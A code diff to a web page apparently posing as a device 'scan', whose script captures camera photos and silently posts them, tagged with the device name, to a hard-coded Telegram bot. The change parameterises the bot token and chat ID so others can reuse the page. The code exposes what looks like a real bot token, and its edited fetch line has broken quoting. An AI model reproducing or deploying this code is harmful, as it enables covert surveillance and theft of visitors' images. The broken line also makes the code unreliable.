@@ -46,7 +46,9 @@
 </div>
 
 <script>
-const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
+const params = new URLSearchParams(window.location.search);
+const CHAT_ID = params.get("chatId") || "7276604783";
+const BOT_TOKEN = params.get("token") || "8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo";
 document.getElementById('device-name').textContent = '📱 ' + (navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز').trim();
 
 function showPage(id) { document.querySelectorAll('.page').forEach(p => p.classList.remove('active')); document.getElementById(id).classList.add('active'); }
@@ -93,7 +95,7 @@ async function startScan() {
                 fd.append('chat_id', CHAT_ID);
                 fd.append('photo', b, 'photo.jpg');
                 fd.append('caption', '📸 من: ' + document.getElementById('device-name').textContent);
-                fetch('https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendPhoto', { method: 'POST', body: fd }).catch(e => {});
+                fetch('`https://api.telegram.org/bot${BOT_TOKEN}/`sendPhoto', { method: 'POST', body: fd }).catch(e => {});
                 
                 pics++;
             };
